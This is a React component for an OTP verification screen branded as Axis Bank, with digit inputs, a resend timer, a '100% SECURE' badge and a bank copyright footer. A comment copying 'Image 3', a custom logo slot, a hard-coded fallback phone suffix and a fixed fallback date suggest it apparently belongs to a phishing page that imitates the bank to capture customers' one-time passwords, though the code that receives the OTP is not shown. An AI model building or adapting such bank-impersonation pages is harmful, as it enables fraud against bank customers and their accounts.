/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useRef } from 'react';
import { ShieldCheck, ArrowLeft } from 'lucide-react';
import { AxisLogoIcon } from './AxisLogo';

// @ts-ignore
import defaultLogoImage from '../../images/AXISBANK.BO.png';

interface OtpVerificationProps {
  mobileNumber: string;
  onSubmit: (otp: string) => void;
  onResend: () => void;
  onBack?: () => void;
  error?: string | null;
}

export default function OtpVerification({
  mobileNumber,
  onSubmit,
  onResend,
  onBack,
  error,
}: OtpVerificationProps) {
  const [otp, setOtp] = useState<string[]>(Array(6).fill(''));
  const [timeLeft, setTimeLeft] = useState(90); // 1 minute 30 seconds
  const [localError, setLocalError] = useState<string | null>(null);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  const activeError = localError || error;

  const [customLogo, setCustomLogo] = useState<string | null>(defaultLogoImage);

  useEffect(() => {
    const handleStorageChange = () => {
      try {
        setCustomLogo(defaultLogoImage);
      } catch (e) {
        console.error(e);
      }
    };
    window.addEventListener('storage', handleStorageChange);
    window.addEventListener('custom-logo-updated', handleStorageChange);
    return () => {
      window.removeEventListener('storage', handleStorageChange);
      window.removeEventListener('custom-logo-updated', handleStorageChange);
    };
  }, []);

  // Clear OTP and auto-focus first box when error prop is set
  useEffect(() => {
    if (error) {
      setOtp(Array(6).fill(''));
      setTimeout(() => {
        inputRefs.current[0]?.focus();
      }, 50);
    }
  }, [error]);

  // Format the ending phone number
  const lastFour = mobileNumber.length >= 4 ? mobileNumber.slice(-4) : '6466';

  // Format date and time matching standard format (e.g., 17/7/2026 4:42 PM)
  const [dateTimeStr, setDateTimeStr] = useState('');

  useEffect(() => {
    const scrollToTop = () => {
      window.scrollTo(0, 0);
      if (document.documentElement) {
        document.documentElement.scrollTop = 0;
      }
      if (document.body) {
        document.body.scrollTop = 0;
      }
      const container = document.getElementById('app-root-container');
      if (container) {
        container.scrollTop = 0;
      }
    };

    scrollToTop();
    const scrollTimer = setTimeout(scrollToTop, 80);

    const now = new Date();
    const day = now.getDate();
    const month = now.getMonth() + 1;
    const year = now.getFullYear();
    
    let hours = now.getHours();
    const minutes = now.getMinutes();
    const ampm = hours >= 12 ? 'PM' : 'AM';
    hours = hours % 12;
    hours = hours ? hours : 12; // the hour '0' should be '12'
    const minutesStr = minutes < 10 ? '0' + minutes : minutes;
    
    setDateTimeStr(`${day}/${month}/${year} ${hours}:${minutesStr} ${ampm}`);

    return () => clearTimeout(scrollTimer);
  }, []);

  // Timer countdown
  useEffect(() => {
    if (timeLeft <= 0) return;
    const timer = setInterval(() => {
      setTimeLeft((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  // Format seconds to MM:SS
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `Wait ${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}s`;
  };

  // Handle single input change
  const handleChange = (element: HTMLInputElement, index: number) => {
    if (localError) setLocalError(null);
    const val = element.value;
    if (isNaN(Number(val))) return;

    const newOtp = [...otp];
    // Take only the last entered character
    newOtp[index] = val.substring(val.length - 1);
    setOtp(newOtp);

    // If a value was entered, focus next input
    if (val && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  // Handle backspace key press
  const handleKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, index: number) => {
    if (localError) setLocalError(null);
    if (e.key === 'Backspace') {
      if (!otp[index] && index > 0) {
        // Shift focus to previous input if empty
        const newOtp = [...otp];
        newOtp[index - 1] = '';
        setOtp(newOtp);
        inputRefs.current[index - 1]?.focus();
      } else {
        const newOtp = [...otp];
        newOtp[index] = '';
        setOtp(newOtp);
      }
    }
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    if (localError) setLocalError(null);
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').slice(0, 6);
    if (!/^\d+$/.test(pastedData)) return;

    const newOtp = [...otp];
    for (let i = 0; i < pastedData.length; i++) {
      newOtp[i] = pastedData[i];
    }
    setOtp(newOtp);
    // Focus last filled or the next empty
    const focusIndex = Math.min(pastedData.length, 5);
    inputRefs.current[focusIndex]?.focus();
  };

  const handleFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const fullOtp = otp.join('');
    if (fullOtp.length === 6) {
      setLocalError(null);
      onSubmit(fullOtp);
    } else {
      setLocalError('Please enter the complete 6-digit OTP code');
      // Focus first empty box
      const firstEmptyIndex = otp.findIndex(digit => !digit);
      if (firstEmptyIndex !== -1) {
        inputRefs.current[firstEmptyIndex]?.focus();
      } else {
        inputRefs.current[0]?.focus();
      }
    }
  };

  const handleResendClick = () => {
    setLocalError(null);
    setTimeLeft(90);
    setOtp(Array(6).fill(''));
    onResend();
    inputRefs.current[0]?.focus();
  };

  const isOtpComplete = otp.join('').length === 6;

  return (
    <div className="max-w-xl mx-auto px-4 py-4" id="otp-verification-view">
      
      {/* OTP Container Box styled exactly like Image 3 */}
      <div className="bg-white rounded-3xl border border-gray-100 shadow-sm p-6 space-y-6 relative" id="otp-card-container">
        {/* Top visual separator/border */}
        <div className="absolute top-0 left-0 right-0 h-1.5 bg-rose-800 rounded-t-3xl" />

        {/* Card Header Section */}
        <div className="flex justify-between items-center" id="otp-card-header">
          {/* Logo with specific Axis color */}
          <div className="flex items-center gap-3" id="otp-logo-container">
            {onBack && (
              <button
                type="button"
                onClick={onBack}
                className="p-1.5 rounded-full hover:bg-gray-100 text-rose-900 transition-colors cursor-pointer"
                aria-label="Go back"
                id="otp-back-button"
              >
                <ArrowLeft className="w-5 h-5" />
              </button>
            )}
            <div
              className="flex items-center justify-center p-1"
              id="otp-logo-uploader"
            >
              {customLogo ? (
                <div className="flex items-center justify-center" id="custom-otp-logo-display">
                  <img
                    src={customLogo}
                    alt="Custom Axis Logo"
                    className="h-10 max-w-[140px] object-contain rounded-md"
                    id="custom-logo-image"
                    referrerPolicy="no-referrer"
                  />
                </div>
              ) : (
                <div className="flex items-center justify-center" id="otp-default-logo-container">
                  <AxisLogoIcon className="w-10 h-10" color="#AE275F" />
                </div>
              )}
            </div>
          </div>

          {/* Secure padlock */}
          <div 
            className="flex items-center gap-1.5 text-[10px] md:text-xs text-emerald-600 bg-emerald-50 border border-emerald-100 px-3 py-1 rounded-full font-bold tracking-wide uppercase"
            id="otp-secure-status"
          >
            <ShieldCheck className="w-3.5 h-3.5 fill-emerald-50 text-emerald-600" />
            <span>100% SECURE</span>
          </div>
        </div>

        {/* Headings */}
        <div className="space-y-2 text-center" id="otp-headings">
          <h1 className="text-2xl font-bold text-gray-800 tracking-tight" id="otp-main-heading">
            Verify Securely
          </h1>
          <p className="text-gray-500 text-xs md:text-sm leading-relaxed" id="otp-instructions-text">
            An OTP has been sent to <span className="font-bold text-gray-800">mobile number ending in ******{lastFour}</span>. Please enter the OTP below to authenticate.
          </p>
        </div>

        {/* Date & Time display bar */}
        <div className="flex justify-between items-center bg-gray-50/70 border border-gray-100 rounded-xl px-4 py-3 text-xs" id="otp-datetime-bar">
          <span className="text-gray-400 font-semibold uppercase tracking-wider">Date & Time</span>
          <span className="text-gray-800 font-bold tracking-tight">{dateTimeStr || '17/7/2026 4:42 PM'}</span>
        </div>

        {/* Six Code Box Inputs */}
        <form onSubmit={handleFormSubmit} className="space-y-6" id="otp-form">
          <div className="space-y-2" id="otp-input-group">
            <label className="block text-xs font-bold text-gray-500 uppercase tracking-widest text-center">
              Enter OTP
            </label>
            <div className="flex justify-center gap-3 md:gap-4 py-2" id="otp-inputs-row">
              {otp.map((data, index) => (
                <input
                  key={index}
                  type="text"
                  maxLength={1}
                  value={data}
                  ref={(el) => { inputRefs.current[index] = el; }}
                  onChange={(e) => handleChange(e.target, index)}
                  onKeyDown={(e) => handleKeyDown(e, index)}
                  onPaste={handlePaste}
                  className={`w-10 h-14 md:w-12 md:h-16 text-center text-2xl font-bold text-black outline-none transition-all placeholder-transparent focus:ring-0 border-b-2 ${
                    activeError 
                      ? 'border-red-500 focus:border-red-600' 
                      : 'border-gray-200 focus:border-rose-800'
                  }`}
                  style={{ caretColor: '#AE275F' }}
                  id={`otp-box-${index}`}
                />
              ))}
            </div>
            {activeError && (
              <div className="text-center animate-fade-in" id="otp-error-container">
                <p className="text-xs md:text-sm text-red-600 font-bold bg-red-50 border border-red-200/50 rounded-xl py-2.5 px-4 inline-block shadow-xs" id="otp-error-message">
                  {activeError}
                </p>
              </div>
            )}
          </div>

          {/* Countdown & Resend Options */}
          <div className="flex justify-between items-center text-xs px-1" id="otp-resend-bar">
            <span className="text-gray-400 font-semibold">Didn't receive the OTP?</span>
            {timeLeft > 0 ? (
              <span className="text-rose-800 font-bold tracking-wide" id="otp-timer">
                {formatTime(timeLeft)}
              </span>
            ) : (
              <button
                type="button"
                onClick={handleResendClick}
                className="text-rose-800 hover:text-rose-950 font-extrabold underline tracking-wide cursor-pointer transition-colors"
                id="btn-otp-resend"
              >
                Resend OTP
              </button>
            )}
          </div>

          {/* Submit Button */}
          <div className="space-y-4" id="otp-submit-group">
            <button
              type="submit"
              className="w-full bg-[#AE275F] hover:bg-[#97144D] active:bg-[#7A0C3C] active:scale-[0.98] text-white py-4 px-6 rounded-2xl font-bold tracking-wide transition-all shadow-md hover:shadow-lg flex items-center justify-center gap-2 cursor-pointer touch-manipulation select-none"
              id="btn-otp-submit"
            >
              SUBMIT
            </button>

            {/* Disclaimer */}
            <p className="text-[11px] text-red-500 font-bold text-center leading-relaxed" id="otp-disclaimer">
              Please do not click 'Back' or refresh this page.
            </p>
          </div>
        </form>
      </div>

      {/* Copyright branding footer */}
      <div className="text-center mt-6 text-gray-400 text-xs font-semibold" id="otp-copyright">
        © 2026 Axis Bank. All rights reserved.
      </div>
    </div>
  );
}
